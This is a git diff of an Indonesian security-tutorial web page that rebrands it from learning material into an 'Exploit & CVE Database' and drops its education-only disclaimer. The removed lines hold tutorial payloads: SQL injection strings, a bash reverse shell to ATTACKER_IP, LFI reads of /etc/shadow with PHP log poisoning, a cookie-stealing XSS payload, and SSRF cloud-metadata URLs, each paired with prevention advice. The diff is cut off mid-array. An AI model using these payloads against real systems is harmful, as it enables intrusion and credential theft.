@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#00e5a0">
 <title>Unknown1337 | Cyber Security</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -15,6 +16,7 @@
   --glow:rgba(0,229,160,0.12);--nav:rgba(240,242,247,0.96);
   --badge:#edfaf4;--badge-t:#00875a;
   --warn:#fff7ed;--warn-t:#b45309;
+  --critical:#fee2e2;--critical-t:#991b1b;
 }
 body.dark{
   --bg:#08090d;--bg2:#10131a;--bg3:#0d1017;--card:#0f1219;
@@ -23,31 +25,26 @@ body.dark{
   --glow:rgba(0,255,179,0.1);--nav:rgba(8,9,13,0.97);
   --badge:#0a2a1e;--badge-t:#00e5a0;
   --warn:#1a1200;--warn-t:#fbbf24;
+  --critical:#1c0505;--critical-t:#f87171;
 }
-body{font-family:'Space Grotesk',sans-serif;background:var(--bg);color:var(--t1);transition:background .3s,color .2s;scroll-behavior:smooth;}
-a{color:inherit;text-decoration:none;}
+body{font-family:'Space Grotesk',sans-serif;background:var(--bg);color:var(--t1);transition:.3s;scroll-behavior:smooth;}
 .container{max-width:1360px;margin:0 auto;padding:0 24px;}
-
-/* NAV */
 .navbar{position:fixed;top:0;width:100%;background:var(--nav);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);z-index:1000;padding:.75rem 0;}
 .nav-c{display:flex;justify-content:space-between;align-items:center;max-width:1360px;margin:0 auto;padding:0 24px;}
 .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1.2rem;color:var(--accent);}
-.logo span{color:var(--t3);font-weight:400;}
+.logo span{color:var(--t3);}
 .nav-links{display:flex;gap:1rem;align-items:center;flex-wrap:wrap;}
-.nav-links a{font-weight:500;color:var(--t2);transition:color .2s;font-size:.85rem;padding:.3rem .5rem;border-radius:.4rem;}
+.nav-links a{font-weight:500;color:var(--t2);font-size:.85rem;padding:.3rem .5rem;border-radius:.4rem;text-decoration:none;}
 .nav-links a:hover{color:var(--accent);}
-.theme-btn{background:var(--bg3);border:1px solid var(--border);border-radius:2rem;padding:.3rem .9rem;cursor:pointer;font-size:.8rem;color:var(--t2);display:flex;align-items:center;gap:6px;transition:.2s;}
-.theme-btn:hover{border-color:var(--accent);color:var(--accent);}
+.theme-btn{background:var(--bg3);border:1px solid var(--border);border-radius:2rem;padding:.3rem .9rem;cursor:pointer;font-size:.8rem;color:var(--t2);display:flex;align-items:center;gap:6px;}
 .hamburger{display:none;font-size:1.4rem;cursor:pointer;color:var(--accent);}
-
-/* HERO */
 .hero{min-height:55vh;display:flex;align-items:center;padding:110px 0 50px;}
-.hero-badge{display:inline-flex;align-items:center;gap:.5rem;background:var(--badge);color:var(--badge-t);border-radius:2rem;padding:.3rem .9rem;font-size:.75rem;font-weight:600;font-family:'JetBrains Mono',monospace;margin-bottom:1.2rem;border:1px solid rgba(0,229,160,.2);}
+.hero-badge{display:inline-flex;align-items:center;gap:.5rem;background:var(--badge);color:var(--badge-t);border-radius:2rem;padding:.3rem .9rem;font-size:.75rem;font-weight:600;font-family:'JetBrains Mono',monospace;margin-bottom:1.2rem;}
 .hero h1{font-family:'JetBrains Mono',monospace;font-size:2.8rem;font-weight:700;line-height:1.15;}
 .hero h1 .hl{color:var(--accent);}
 .hero p{font-size:1rem;color:var(--t2);margin:1rem 0 1.8rem;max-width:580px;line-height:1.7;}
 .hero-btns{display:flex;gap:.8rem;flex-wrap:wrap;}
-.btn{padding:.6rem 1.5rem;border-radius:2rem;font-weight:600;cursor:pointer;transition:.2s;font-size:.9rem;display:inline-flex;align-items:center;gap:.4rem;}
+.btn{padding:.6rem 1.5rem;border-radius:2rem;font-weight:600;cursor:pointer;font-size:.9rem;display:inline-flex;align-items:center;gap:.4rem;text-decoration:none;}
 .btn-primary{background:var(--accent);color:#000;border:none;}
 .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px var(--glow);}
 .btn-outline{background:transparent;color:var(--t2);border:1.5px solid var(--border);}
@@ -56,20 +53,14 @@ a{color:inherit;text-decoration:none;}
 .stat{text-align:center;}
 .stat-n{font-family:'JetBrains Mono',monospace;font-size:1.6rem;font-weight:700;color:var(--accent);}
 .stat-l{font-size:.75rem;color:var(--t3);margin-top:.2rem;}
-
-/* DISCLAIMER */
 .disclaimer{background:var(--warn);border:1px solid rgba(180,83,9,.2);border-radius:1rem;padding:1rem 1.4rem;margin:1rem 0 2rem;display:flex;align-items:flex-start;gap:.8rem;}
-.disclaimer i{color:var(--warn-t);margin-top:2px;flex-shrink:0;}
+.disclaimer i{color:var(--warn-t);margin-top:2px;}
 .disclaimer p{font-size:.82rem;color:var(--warn-t);line-height:1.6;}
-
-/* SECTION */
 .section-title{font-size:1.5rem;font-family:'JetBrains Mono',monospace;margin:2.5rem 0 1.5rem;border-left:3px solid var(--accent);padding-left:1rem;color:var(--t1);}
 .section-sub{font-size:.85rem;color:var(--t3);margin-top:.4rem;padding-left:1.2rem;}
-
-/* OS SECTION */
 .os-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1.2rem;margin-bottom:2rem;}
 .os-card{background:var(--card);border:1px solid var(--border);border-radius:1rem;padding:1.2rem;transition:.2s;position:relative;overflow:hidden;}
-.os-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--accent);opacity:0;transition:.2s;}
+.os-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--accent);opacity:0;}
 .os-card:hover{border-color:var(--accent);transform:translateY(-3px);box-shadow:0 12px 30px var(--glow);}
 .os-card:hover::before{opacity:1;}
 .os-card-head{display:flex;align-items:center;gap:.8rem;margin-bottom:.8rem;}
@@ -79,8 +70,6 @@ a{color:inherit;text-decoration:none;}
 .os-card p{font-size:.8rem;color:var(--t3);line-height:1.6;}
 .os-pros{margin-top:.8rem;display:flex;flex-wrap:wrap;gap:.4rem;}
 .os-pro{font-size:.68rem;background:var(--bg3);border:1px solid var(--border);border-radius:.5rem;padding:.2rem .6rem;color:var(--t2);}
-
-/* TOOLS */
 .tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.2rem;margin-bottom:2rem;}
 .tool-card{background:var(--card);border:1px solid var(--border);border-radius:1rem;padding:1.2rem;transition:.2s;}
 .tool-card:hover{border-color:var(--accent);transform:translateY(-3px);}
@@ -88,46 +77,44 @@ a{color:inherit;text-decoration:none;}
 .tool-card p{color:var(--t3);font-size:.8rem;margin-bottom:.8rem;line-height:1.5;}
 .tool-tags{display:flex;flex-wrap:wrap;gap:.3rem;margin-bottom:.7rem;}
 .tool-tag{font-size:.65rem;background:var(--bg3);border:1px solid var(--border);border-radius:.5rem;padding:.15rem .5rem;color:var(--t3);}
-.repo-link{color:var(--accent);font-size:.75rem;font-family:'JetBrains Mono',monospace;display:inline-flex;align-items:center;gap:.3rem;}
-.repo-link:hover{text-decoration:underline;}
-
-/* MATERI TABS */
 .tab-nav{display:flex;flex-wrap:wrap;gap:.4rem;margin-bottom:1.5rem;border-bottom:1px solid var(--border);padding-bottom:.8rem;}
-.tab-btn{background:transparent;border:1px solid transparent;padding:.4rem 1rem;font-family:'JetBrains Mono',monospace;font-size:.78rem;font-weight:500;color:var(--t3);cursor:pointer;border-radius:2rem;transition:.2s;}
+.tab-btn{background:transparent;border:1px solid transparent;padding:.4rem 1rem;font-family:'JetBrains Mono',monospace;font-size:.78rem;font-weight:500;color:var(--t3);cursor:pointer;border-radius:2rem;}
 .tab-btn.active{background:var(--accent);color:#000;border-color:var(--accent);}
 .tab-btn:hover:not(.active){color:var(--accent);border-color:var(--accent);}
 .tab-panel{display:none;}
 .tab-panel.active{display:block;}
-.materi-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:1.4rem;margin:1rem 0 2rem;}
+.materi-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1.4rem;margin:1rem 0 2rem;}
 .materi-card{background:var(--card);border:1px solid var(--border);border-radius:1rem;padding:1.2rem;transition:.2s;cursor:pointer;}
 .materi-card:hover{border-color:var(--accent);transform:translateY(-4px);box-shadow:0 10px 28px var(--glow);}
-.materi-card-head{display:flex;align-items:center;gap:.6rem;margin-bottom:.6rem;}
+.materi-card-head{display:flex;align-items:center;gap:.6rem;margin-bottom:.6rem;flex-wrap:wrap;}
 .materi-card h3{font-family:'JetBrains Mono',monospace;color:var(--accent);font-size:.9rem;}
 .difficulty{font-size:.63rem;padding:.15rem .55rem;border-radius:1rem;font-weight:600;font-family:'JetBrains Mono',monospace;}
 .diff-easy{background:#dcfce7;color:#166534;}
 .diff-med{background:#fef9c3;color:#854d0e;}
 .diff-hard{background:#fee2e2;color:#991b1b;}
+.diff-critical{background:#fee2e2;color:#dc2626;}
 body.dark .diff-easy{background:#052e16;color:#4ade80;}
 body.dark .diff-med{background:#1c1500;color:#fbbf24;}
 body.dark .diff-hard{background:#1c0505;color:#f87171;}
+body.dark .diff-critical{background:#1c0505;color:#f87171;}
 .materi-card p{color:var(--t3);font-size:.78rem;line-height:1.55;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden;}
 .read-more{margin-top:.8rem;font-size:.7rem;color:var(--accent);font-family:'JetBrains Mono',monospace;display:flex;align-items:center;gap:.3rem;}
-
-/* FAQ */
+.search-bar{margin-bottom:1.5rem;position:relative;}
+.search-bar input{width:100%;padding:.8rem 1rem .8rem 2.5rem;background:var(--card);border:1px solid var(--border);border-radius:1rem;font-family:'Space Grotesk',sans-serif;font-size:.85rem;color:var(--t1);}
+.search-bar input:focus{outline:none;border-color:var(--accent);}
+.search-bar i{position:absolute;left:1rem;top:50%;transform:translateY(-50%);color:var(--t3);}
 .faq-list{display:flex;flex-direction:column;gap:.8rem;margin-bottom:2rem;}
-.faq-item{background:var(--card);border:1px solid var(--border);border-radius:1rem;overflow:hidden;transition:.2s;}
+.faq-item{background:var(--card);border:1px solid var(--border);border-radius:1rem;overflow:hidden;}
 .faq-item:hover{border-color:var(--accent);}
 .faq-q{padding:1rem 1.2rem;cursor:pointer;display:flex;justify-content:space-between;align-items:center;font-weight:600;font-size:.9rem;}
-.faq-q i{color:var(--t3);transition:.3s;flex-shrink:0;}
+.faq-q i{color:var(--t3);transition:.3s;}
 .faq-item.open .faq-q i{transform:rotate(180deg);color:var(--accent);}
-.faq-a{max-height:0;overflow:hidden;transition:max-height .35s ease,padding .2s;}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .35s ease;}
 .faq-item.open .faq-a{max-height:400px;padding:0 1.2rem 1rem;}
 .faq-a p{font-size:.83rem;color:var(--t2);line-height:1.7;}
-
-/* MODAL */
-.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:2000;justify-content:center;align-items:center;backdrop-filter:blur(5px);}
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);z-index:2000;justify-content:center;align-items:center;backdrop-filter:blur(5px);}
 .modal.active{display:flex;}
-.modal-content{background:var(--card);width:90%;max-width:780px;max-height:88vh;border-radius:1.5rem;border:1px solid var(--accent);overflow:hidden;animation:fadeUp .3s ease;}
+.modal-content{background:var(--card);width:90%;max-width:850px;max-height:88vh;border-radius:1.5rem;border:1px solid var(--accent);overflow:hidden;animation:fadeUp .3s ease;}
 @keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
 .modal-header{padding:.9rem 1.4rem;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;}
 .modal-header h2{font-family:'JetBrains Mono',monospace;color:var(--accent);font-size:1.1rem;}
@@ -136,23 +123,22 @@ body.dark .diff-hard{background:#1c0505;color:#f87171;}
 .modal-body{padding:1.4rem;overflow-y:auto;max-height:75vh;color:var(--t2);line-height:1.65;font-size:.88rem;}
 .modal-body p{margin-bottom:.9rem;}
 .modal-body h4{font-family:'JetBrains Mono',monospace;color:var(--accent);margin:.8rem 0 .4rem;font-size:.85rem;}
-.modal-body pre,.modal-body code{background:var(--bg3);padding:.6rem .9rem;border-radius:.5rem;font-family:'JetBrains Mono',monospace;font-size:.75rem;overflow-x:auto;display:block;margin:.6rem 0;border:1px solid var(--border);}
+.modal-body pre,.modal-body code{background:var(--bg3);padding:.6rem .9rem;border-radius:.5rem;font-family:'JetBrains Mono',monospace;font-size:.72rem;overflow-x:auto;display:block;margin:.6rem 0;border:1px solid var(--border);white-space:pre-wrap;word-break:break-all;}
 .modal-body ul{padding-left:1.2rem;margin:.5rem 0;}
-.modal-body ul li{margin:.3rem 0;font-size:.83rem;color:var(--t2);}
-
-/* FOOTER */
+.modal-body ul li{margin:.3rem 0;}
+.scroll-top{position:fixed;bottom:2rem;right:2rem;width:40px;height:40px;background:var(--accent);color:#000;border:none;border-radius:50%;cursor:pointer;display:none;align-items:center;justify-content:center;font-size:1.2rem;z-index:999;}
+.scroll-top.show{display:flex;}
 footer{text-align:center;padding:2rem;border-top:1px solid var(--border);margin-top:2rem;color:var(--t3);font-size:.8rem;}
-footer .footer-logo{font-family:'JetBrains Mono',monospace;color:var(--accent);font-size:1rem;margin-bottom:.4rem;}
-
-/* RESPONSIVE */
 @media(max-width:768px){
   .nav-links{position:fixed;top:58px;left:-100%;flex-direction:column;background:var(--nav);backdrop-filter:blur(14px);width:78%;height:calc(100vh - 58px);padding:1.5rem;transition:left .3s;border-right:1px solid var(--border);align-items:flex-start;gap:.8rem;}
   .nav-links.active{left:0;}
   .hamburger{display:block;}
   .hero h1{font-size:1.9rem;}
+  .hero{padding:90px 0 30px;min-height:auto;}
   .section-title{font-size:1.2rem;}
   .materi-grid,.os-grid,.tools-grid{grid-template-columns:1fr;}
-  .hero-stats{gap:1.2rem;}
+  .hero-stats{gap:1rem;}
+  .modal-content{width:95%;}
 }
 html{scroll-padding-top:68px;}
 </style>
@@ -167,88 +153,64 @@ html{scroll-padding-top:68px;}
     <a href="#home">home</a>
     <a href="#os">linux os</a>
     <a href="#tools">tools</a>
-    <a href="#materi">materi</a>
+    <a href="#materi">exploits</a>
     <a href="#faq">faq</a>
-    <a href="#github">github</a>
     <button class="theme-btn" id="themeToggle"><i class="fas fa-circle-half-stroke"></i> mode</button>
   </div>
 </div>
 </nav>
 
 <main>
-
-<!-- HERO -->
 <section id="home" class="hero">
 <div class="container">
-  <div class="hero-badge"><i class="fas fa-terminal"></i> ROOT UNKNOWN1337</div>
-  <h1>Halo, saya <span class="hl">Unknown1337</span><br>Cyber Security Researcher</h1>
-  <p>Platform offensive security, penetration testing, linux commands, web targeting, dan ethical hacking.</p>
+  <div class="hero-badge"><i class="fas fa-skull"></i> ROOT 1337  </div>
+  <h1>Unknown<span class="hl">1337</span><br>Exploit &amp; CVE Database</h1>
+  <p> exploit vulnerabilities, CVE, web security, network pentest, privilege escalation.</p>
   <div class="hero-btns">
-    <a href="#materi" class="btn btn-primary"><i class="fas fa-book-open"></i> explore materi</a>
-    <a href="#tools" class="btn btn-outline"><i class="fab fa-github"></i> lihat tools</a>
+    <a href="#materi" class="btn btn-primary"><i class="fas fa-bug"></i> explore exploits</a>
+    <a href="#tools" class="btn btn-outline"><i class="fas fa-terminal"></i> tools</a>
   </div>
   <div class="hero-stats">
-    <div class="stat"><div class="stat-n">100+</div><div class="stat-l">Linux Commands</div></div>
-    <div class="stat"><div class="stat-n">8+</div><div class="stat-l">Hacking Tools</div></div>
-    <div class="stat"><div class="stat-n">40+</div><div class="stat-l">Materi Topik</div></div>
+    <div class="stat"><div class="stat-n">700+</div><div class="stat-l">Total Exploits</div></div>
+    <div class="stat"><div class="stat-n">650+</div><div class="stat-l">CVE Database</div></div>
+    <div class="stat"><div class="stat-n">30+</div><div class="stat-l">Web Exploits</div></div>
+    <div class="stat"><div class="stat-n">20+</div><div class="stat-l">Network Exploits</div></div>
   </div>
 </div>
 </section>
 
-<!-- OS RECOMMENDATIONS -->
+
+
 <section id="os">
 <div class="container">
-  <div class="section-title"> distro linux untuk security</div>
-  <p class="section-sub">Rekomendasi OS Linux terbaik untuk ethical hacking, riset keamanan</p>
-  <div class="os-grid" id="osGrid">
-    <!-- akan diisi JS -->
-  </div>
+  <div class="section-title">Linux Distro for Security</div>
+  <div class="os-grid" id="osGrid"></div>
 </div>
 </section>
 
-<!-- TOOLS -->
 <section id="tools">
 <div class="container">
-  <div class="section-title"> hacking tools & repositories</div>
-  <p class="section-sub">Tools untuk digunakan di environment lab, CTF, dan authorized penetration testing</p>
-  <div class="tools-grid" id="toolsGrid">
-    <!-- akan diisi JS -->
-  </div>
+  <div class="section-title">Hacking Tools</div>
+  <div class="tools-grid" id="toolsGrid"></div>
 </div>
 </section>
 
-<!-- MATERI -->
 <section id="materi">
 <div class="container">
-  <div class="section-title"> security materials</div>
-  <p class="section-sub">Klik kartu untuk membaca materi lengkap dengan contoh command dan penjelasan mendalam</p>
-  <div class="tab-nav" id="tabNav">
-    <!-- tab buttons akan diisi JS -->
+  <div class="section-title">Complete Exploit &amp; Vulnerability Database</div>
+  <div class="search-bar">
+    <i class="fas fa-search"></i>
+    <input type="text" id="searchInput" placeholder="Cari exploit, CVE, vulnerability...">
   </div>
-  <div id="tabPanels">
-    <!-- panels akan diisi JS -->
-  </div>
+  <div class="tab-nav" id="tabNav"></div>
+  <div id="tabPanels"></div>
 </div>
 </section>
 
-<!-- FAQ -->
 <section id="faq">
 <div class="container">
-  <div class="section-title"> frequently asked questions</div>
-  <p class="section-sub">Pertanyaan umum seputar belajar ethical hacking dan keamanan siber</p>
-  <div class="faq-list" id="faqList">
-    <!-- akan diisi JS -->
-  </div>
-</div>
-</section>
-
-<!-- GITHUB -->
-<section id="github">
-<div class="container">
-  <div class="section-title"> github repositories</div>
-  <div class="tools-grid">
-    <div class="tool-card"><h3>PsychoH4x0r</h3><p>Semua project tersedia di GitHub: usb-ducky, network-attack, webshell (lab), AI research, kernel custom, change-ip, scraping-url. Star dan fork untuk mendukung riset open source.</p><div class="tool-tags"><span class="tool-tag">open source</span><span class="tool-tag">pentest tools</span><span class="tool-tag">research</span></div><a href="https://github.com/PsychoH4x0r" target="_blank" class="repo-link"><i class="fab fa-github"></i> visit profile →</a></div>
-  </div>
+  <div class="section-title">FAQ</div>
+  <div class="faq-list" id="faqList"></div>
 </div>
 </section>
 </main>
@@ -256,8 +218,8 @@ html{scroll-padding-top:68px;}
 <footer>
 <div class="container">
   <div class="footer-logo">unknown1337</div>
-  <p>offensive security research • ethical hacking • linux • web pentesting</p>
-  <p style="margin-top:.4rem;font-size:.72rem;">Semua konten untuk tujuan edukasi . Gunakan secara bertanggung jawab dan legal.</p>
+  <p>complete exploit database   | CVE | web security | network pentest | linux privesc</p>
+  
 </div>
 </footer>
 
@@ -268,258 +230,405 @@ html{scroll-padding-top:68px;}
   </div>
 </div>
 
+<button class="scroll-top" id="scrollTopBtn"><i class="fas fa-arrow-up"></i></button>
+
 <script>
-// ==================== DATA DEFINITIONS ====================
-
-// OS Data
-const OS_DATA = [
-  { icon: "", name: "Kali Linux", badge: "PALING POPULER", desc: "Distro #1 untuk penetration testing. Dikembangkan oleh Offensive Security, sudah pre-install 600+ tools hacking (nmap, metasploit, burpsuite, wireshark, dll). Cocok untuk pemula sampai profesional.", tags: ["600+ tools built-in", "Rolling release", "ARM support", "Live boot"] },
-  { icon: "", name: "Parrot OS", badge: "PALING RINGAN", desc: "Alternatif Kali yang lebih ringan dan cocok untuk laptop spek rendah. Ada dua varian: Security Edition (hacking) dan Home Edition (daily use). UI lebih friendly, RAM usage lebih hemat.", tags: ["RAM hemat", "Daily use friendly", "Anonimitas built-in", "Debian-based"] },
-  { icon: "", name: "Tails OS", badge: "PALING AMAN", desc: "Distro yang fokus pada anonimitas dan privasi. Semua traffic dirutekan melalui Tor network. Tidak meninggalkan jejak di komputer (amnesia OS). Ideal untuk riset anonim dan whistleblower.", tags: ["100% Tor routing", "No trace", "Amnesia mode", "Live USB only"] },
-  { icon: "", name: "BlackArch Linux", badge: "UNTUK ADVANCED", desc: "Repo terbesar di dunia dengan 2800+ security tools. Berbasis Arch Linux, jadi butuh pengetahuan Linux yang cukup. Lebih fleksibel dari Kali tapi membutuhkan konfigurasi manual lebih banyak.", tags: ["2800+ tools", "Arch-based", "Highly customizable", "Rolling release"] },
-  { icon: "", name: "REMnux", badge: "MALWARE ANALYSIS", desc: "Distro khusus untuk analisis malware dan reverse engineering. Tools untuk membedah file berbahaya, analisis network, dan forensik digital. Sangat berguna untuk blue team dan incident response.", tags: ["Malware sandbox", "RE tools", "Blue team", "DFIR ready"] },
-  { icon: "", name: "Ubuntu Server", badge: "UNTUK LAB", desc: "Bukan distro hacking, tapi sangat berguna sebagai target lab atau server untuk eksperimen. Konfigurasi mudah, komunitas besar, dan bisa diatur sebagai mesin vulnerable dengan Metasploitable.", tags: ["Lab target", "Komunitas besar", "Dokumentasi lengkap", "VM friendly"] }
+// OS DATA
+var OS_DATA = [
+  { icon: "K", name: "Kali Linux", badge: "POPULER", desc: "Distro untuk penetration testing dengan 600+ tools pre-installed.", tags: ["600+ tools", "Rolling release", "Live boot"] },
+  { icon: "P", name: "Parrot OS", badge: "RINGAN", desc: "Alternatif Kali yang lebih ringan untuk laptop spek rendah.", tags: ["RAM hemat", "User friendly", "Debian based"] },
+  { icon: "T", name: "Tails OS", badge: "ANONIM", desc: "Distro fokus anonimitas dengan semua traffic via Tor.", tags: ["Tor routing", "No trace", "Live USB"] },
+  { icon: "B", name: "BlackArch", badge: "ADVANCED", desc: "Repo terbesar dengan 2800+ security tools.", tags: ["2800+ tools", "Arch based", "Customizable"] }
 ];
 
-// Tools Data
-const TOOLS_DATA = [
-  { name: "USB Ducky", desc: "Keystroke injection framework. Simulasi serangan HID (Human Interface Device) menggunakan rubber ducky payloads. Berguna untuk physical security testing di lab.", tags: ["physical", "HID attack", "payload"], url: "https://github.com/PsychoH4x0r/usb-ducky" },
-  { name: "unknown1337-tools", desc: "All-in-one offensive toolkit: recon, scanning, privilege escalation enumeration. Dibuat untuk CTF dan authorized pentest. Kombinasi berbagai tool populer dalam satu script.", tags: ["recon", "scanning", "privesc"], url: "https://github.com/PsychoH4x0r/unknown1337-tools" },
-  { name: "NETWORK ATTACK", desc: "Suite untuk simulasi network attack: ARP spoofing, MITM, DNS poisoning. Digunakan untuk memahami kelemahan jaringan dan belajar cara mitigasinya di lab environment.", tags: ["MITM", "ARP spoof", "DNS poison"], url: "https://github.com/PsychoH4x0r/NETWORK-ATTACK" },
-  { name: "Unknown1337 WebShell", desc: "Web shell untuk studi post-exploitation di lab. Pelajari bagaimana attacker mempertahankan akses dan cara defender mendeteksinya menggunakan WAF dan file integrity monitoring.", tags: ["post-exploit", "web shell", "lab only"], url: "https://github.com/PsychoH4x0r/Unknown1337-WebShell" },
-  { name: "AI CYBERSECURITY RESEARCH", desc: "Riset penggunaan AI untuk deteksi kerentanan dan anomali keamanan. Menggabungkan machine learning dengan teknik tradisional pentesting untuk analisis yang lebih cerdas.", tags: ["AI/ML", "vuln detection", "research"], url: "https://github.com/PsychoH4x0r/AI-CYBERSECURITY-RESEARCH" },
-  { name: "Kernel Custom 6.16", desc: "Custom Linux kernel dengan security patches tambahan, hardening konfigurasi, dan penyesuaian untuk lab hacking. Belajar cara kerja kernel-level security dari dalam.", tags: ["kernel", "hardening", "custom"], url: "https://github.com/PsychoH4x0r/Kernel-Custom-6.16.0-unknown1337-" },
-  { name: "Change IP 3 Second", desc: "Tool rotasi IP cepat menggunakan ProxyChains dan Tor untuk anonimisasi traffic saat riset. Berguna untuk bypass rate limiting di authorized bug bounty testing.", tags: ["anonymity", "tor", "proxychains"], url: "https://github.com/PsychoH4x0r/Change-IP-address-3-second" },
-  { name: "scraping-url-op", desc: "Advanced OSINT scraping untuk enumerasi URL, subdomain, dan endpoint. Ideal untuk fase reconnaissance dalam authorized penetration testing atau bug bounty.", tags: ["OSINT", "recon", "scraping"], url: "https://github.com/PsychoH4x0r/scraping-url-op" }
+// TOOLS DATA
+var TOOLS_DATA = [
+  { name: "Nmap", desc: "Network scanner untuk port discovery dan OS fingerprinting.", tags: ["scanning", "network"] },
+  { name: "Metasploit", desc: "Framework exploit untuk penetration testing.", tags: ["exploit", "framework"] },
+  { name: "Burp Suite", desc: "Web vulnerability scanner dan proxy.", tags: ["web", "proxy"] },
+  { name: "SQLMap", desc: "Automatic SQL injection tool.", tags: ["sql", "injection"] },
+  { name: "Hydra", desc: "Network login cracker untuk brute force.", tags: ["brute force", "login"] },
+  { name: "John Ripper", desc: "Password cracking tool.", tags: ["cracking", "password"] },
+  { name: "Hashcat", desc: "GPU-accelerated password recovery.", tags: ["cracking", "gpu"] },
+  { name: "Wireshark", desc: "Network protocol analyzer.", tags: ["sniffer", "analysis"] },
+  { name: "Gobuster", desc: "Directory dan DNS brute force.", tags: ["directory", "dns"] },
+  { name: "Nikto", desc: "Web server scanner.", tags: ["scanner", "web"] },
+  { name: "WPScan", desc: "WordPress vulnerability scanner.", tags: ["wordpress", "scanner"] },
+  { name: "JoomScan", desc: "Joomla vulnerability scanner.", tags: ["joomla", "scanner"] }
 ];
 
-// Materi Data
-const MATERI_DATA = {
-  web: [
-    { title: "SQL Injection", diff: "hard", desc: "Teknik exploitasi database melalui input yang tidak tersanitasi. Salah satu vulnerability paling berbahaya dan masih banyak ditemukan hingga hari ini.", content: "<h4>Apa itu SQL Injection?</h4><p>SQL Injection (SQLi) adalah kerentanan di mana attacker menyisipkan perintah SQL berbahaya ke dalam input yang dikirim ke database. Terjadi karena query tidak menggunakan parameterized statement.</p><h4>Tipe-tipe SQLi</h4><ul><li><strong>Classic/In-band SQLi</strong>: Error-based dan Union-based</li><li><strong>Blind SQLi</strong>: Boolean-based dan Time-based</li><li><strong>Out-of-band SQLi</strong>: Menggunakan channel lain (DNS, HTTP)</li></ul><h4>Contoh Payload</h4><pre>' OR '1'='1\n' OR 1=1--\n' UNION SELECT username,password FROM users--</pre><h4>Tool: SQLMap</h4><pre>sqlmap -u 'http://target.com/page?id=1' --dbs\nsqlmap -u 'http://target.com/page?id=1' -D dbname --tables</pre><h4>Pencegahan</h4><ul><li>Gunakan Prepared Statements / Parameterized Queries</li><li>Input validation dan whitelist karakter</li><li>Least privilege pada user database</li></ul>" },
-    { title: "Remote Code Execution (RCE)", diff: "hard", desc: "Kerentanan paling kritis — memungkinkan attacker menjalankan kode arbitrer di server target.", content: "<h4>Apa itu RCE?</h4><p>Remote Code Execution memungkinkan attacker menjalankan perintah sistem operasi atau kode program di server korban dari jarak jauh.</p><h4>Contoh Command Injection</h4><pre>system('ping ' . $_GET['host']);  # BAHAYA!\n?host=8.8.8.8;id\n?host=8.8.8.8|whoami</pre><h4>Reverse Shell setelah RCE</h4><pre>nc -lvp 4444\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</pre><h4>Pencegahan</h4><ul><li>Jangan pernah pass user input langsung ke shell function</li><li>Gunakan escapeshellarg() jika terpaksa</li><li>Disable dangerous PHP functions</li></ul>" },
-    { title: "Local File Inclusion (LFI)", diff: "med", desc: "Kerentanan yang memungkinkan attacker membaca file arbitrer di server, termasuk file sensitif.", content: "<h4>Apa itu LFI?</h4><p>Local File Inclusion terjadi ketika aplikasi meng-include file berdasarkan input user tanpa validasi.</p><h4>Contoh Vulnerable Code</h4><pre>&lt;?php include($_GET['page']); ?&gt;\n?page=../../../../etc/passwd</pre><h4>File Target Menarik</h4><ul><li>/etc/passwd — daftar user sistem</li><li>/etc/shadow — password hash</li><li>/var/log/apache2/access.log — untuk log poisoning</li></ul><h4>LFI to RCE via Log Poisoning</h4><pre>curl -A '&lt;?php system($_GET['cmd']); ?&gt;' http://target.com\n?page=../../../../var/log/apache2/access.log&cmd=id</pre>" },
-    { title: "Cross-Site Scripting (XSS)", diff: "med", desc: "Injeksi JavaScript ke halaman web yang dilihat user lain. 3 tipe: Reflected, Stored, dan DOM-based.", content: "<h4>Apa itu XSS?</h4><p>Cross-Site Scripting adalah injeksi kode JavaScript berbahaya ke halaman web.</p><h4>3 Tipe XSS</h4><ul><li><strong>Reflected XSS</strong>: Payload di URL</li><li><strong>Stored XSS</strong>: Payload disimpan di database</li><li><strong>DOM-based XSS</strong>: Diproses JavaScript client-side</li></ul><h4>Payload Dasar</h4><pre>&lt;script&gt;alert('XSS')&lt;/script&gt;\n&lt;img src=x onerror=alert(1)&gt;\n'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre><h4>Pencegahan</h4><ul><li>Encode output: htmlspecialchars() di PHP</li><li>Content Security Policy (CSP) header</li><li>HTTPOnly dan SameSite cookie flags</li></ul>" },
-    { title: "CSRF & SSRF", diff: "med", desc: "CSRF memaksa user yang sudah login melakukan aksi tanpa sepengetahuannya. SSRF memaksa server melakukan request ke internal network.", content: "<h4>CSRF (Cross-Site Request Forgery)</h4><pre>&lt;img src='http://bank.com/transfer?to=attacker&amount=1000000'&gt;</pre><p>Pencegahan CSRF: Anti-CSRF token, SameSite cookie, Referer validation.</p><h4>SSRF (Server-Side Request Forgery)</h4><pre>http://localhost/admin\nhttp://169.254.169.254/latest/meta-data/  # AWS metadata!\nfile:///etc/passwd</pre><h4>Pencegahan SSRF</h4><ul><li>Whitelist domain/IP yang boleh di-request</li><li>Blocklist IP private</li><li>Disable redirect pada HTTP client</li></ul>" },
